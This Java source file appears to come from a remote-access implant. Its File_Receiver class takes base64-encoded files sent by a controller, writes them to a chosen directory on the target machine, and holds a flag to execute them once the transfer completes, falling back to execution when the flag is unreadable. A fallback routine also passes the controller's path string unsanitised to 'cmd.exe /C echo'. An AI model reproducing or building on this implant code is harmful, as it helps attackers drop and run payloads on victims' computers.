/**
 * Thread class to receive the base64encoded file, decode, then write out to disk
 * 
 * 
 * @author Solomon Sonya
 */

package Implant.FTP.Encoded_File_Transfer;

import java.io.*;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Set;


import Controller.Thread.Thread_Terminal;
import Dialogs.Dialog_File_Or_Payload_Upload;
import Implant.*;

public class File_Receiver extends Thread implements Runnable
{
	public static final String myClassName = "File_Receiver";
	
	public volatile String myID = "";
	public File fleMyFileOut = null;
	
	public FileOutputStream osOut = null;
	String executionParameters = null;
	String senderFullPath = null;
	byte [] outData = null;
		
	String saveDirectoryOnTarget = "";
	String outFileName = "";
	String full_Execution_Command = "";
	boolean executeFileWhenComplete = true;
	String executionCommand = "";
	
	public volatile LinkedList<File_Receiver>parent_list_file_receivers = null;
	
	                                              																																  																										 
	public File_Receiver(LinkedList<File_Receiver>par_list_file_receivers, String id, String filePathOnSender, String fileName, String executionArguments, String saveDir, String fullExecutionCommand, String executeFileWhenTransferComplete)
	{
		try
		{
			parent_list_file_receivers = par_list_file_receivers;
			myID = id;
			senderFullPath = filePathOnSender;
			executionParameters = executionArguments;			
			saveDirectoryOnTarget = saveDir;
			full_Execution_Command = fullExecutionCommand;
			
			try
			{
				executeFileWhenComplete = Boolean.parseBoolean(executeFileWhenTransferComplete.trim());
			}
			catch(Exception e)
			{
				Driver.sop("* * * ");
				Driver.sop("* * * ");
				Driver.sop("* * * ");
				Driver.sop("DEFUAULTING TO EXECUTE UPON FILE TRANSFER COMPLETION!");
				Driver.sop("* * * ");
				Driver.sop("* * * ");
				Driver.sop("* * * ");
				executeFileWhenComplete = true;
			}
			
			
			if(fileName == null || fileName.trim().equals(""))
			{
				//try extracting the name from the full path provided by sender
				try
				{
					fileName = Driver.getFileName_From_FullPath(senderFullPath);
				}catch(Exception e){}
				
				if(fileName == null || fileName.trim().equals(""))
				{
					Driver.sop("\n\n* * * FILE NAME STILL INVALID FROM SENDER * * *");
					
					fileName = "file_" + Driver.getTime_Current_Millis();
				}
				
				
			}
			
			outFileName = fileName;
			
			//CREATE THE FILE
						
			try
			{
				if(saveDirectoryOnTarget.endsWith(Driver.fileSeperator))
					fleMyFileOut = new File(saveDirectoryOnTarget + fileName);
				else
					fleMyFileOut = new File(saveDirectoryOnTarget + Driver.fileSeperator + fileName);
			}
			catch(Exception e)
			{
				
				fleMyFileOut = new File(".\\");
			}
			
			//
			//initialize the output stream
			//
			osOut = new FileOutputStream(fleMyFileOut);
			
			//
			//made it here, ready to receive
			//
			Driver.sop("Ready to begin receiving file from sender!!!");
			
			//
			//start thread
			//
			this.start();
		}
		catch(FileNotFoundException fnfe)
		{
			Driver.sop("Primary file save was not successful. Switching to secondary routine now...");
			
			createOutFile_SECONDARY();
			
		}
		catch(Exception e)
		{
			Driver.eop("Constructor", myClassName, e, "", true);
		}
		
	}
	
	/**
	 * PERHAPS AN ENVIRONMENT VARIABLE WAS SPECIFIED IN THE FILE PATH, adjust here
	 * @return
	 */
	public boolean createOutFile_SECONDARY()
	{
		try
		{		
			Driver.sop("Attempting to retrieve environment variable...");
			
			Process process = Runtime.getRuntime().exec("cmd.exe /C " + "echo " + this.saveDirectoryOnTarget, null, new File("."));
			BufferedReader process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
			
			String filePath = process_IN.readLine();
			process_IN.close();
			
			
			try
			{
				if(filePath.endsWith(Driver.fileSeperator))
					fleMyFileOut = new File(filePath + outFileName);
				else
					fleMyFileOut = new File(filePath + Driver.fileSeperator + outFileName);
			}
			catch(Exception e)
			{
				
				fleMyFileOut = new File(".\\");
			}
			
			
			
			//
			//initialize the output stream
			//
			osOut = new FileOutputStream(fleMyFileOut);
			
			//
			//made it here, ready to receive
			//
			Driver.sop("Ready to begin receiving file from sender!!!");
			
			//
			//start thread
			//
			this.start();
			
			return true;
		}
		
		catch(Exception e)
		{
			Driver.sop("SECONDARY FILE CREATION FAILED AS WELL. HAVE CONTROLLER VERIFY OUTPUT PATH!!!");			
			Driver.eop("createOutFile_SECONDARY", myClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public void run()
	{
		try
		{
			Driver.sop("File receiver thread started successfully.  Output stream: " + fleMyFileOut.getCanonicalPath());
			
			if(parent_list_file_receivers == null)
			{
				parent_list_file_receivers = new LinkedList<File_Receiver>();
			}
			
			parent_list_file_receivers.add(this);
		}
		
		catch(Exception e)
		{
			Driver.eop("run", myClassName, e, "", false);
		}
		
	}
		
	public boolean write(String base64encoded_data)
	{
		try
		{
			//
			//convert bata to byte array once again
			//
			outData = Driver.getBase64DecodedByteArray_From_Base64EncodedString(base64encoded_data);
			
			//
			//write data to out file
			//
			osOut.write(outData, 0, outData.length);
			osOut.flush();
			return true;
		}
		catch(Exception e)
		{
			Driver.sop("\n\n * * * " + "Error detected during writing out of received file!");
		}
		
		return false;
	}

}
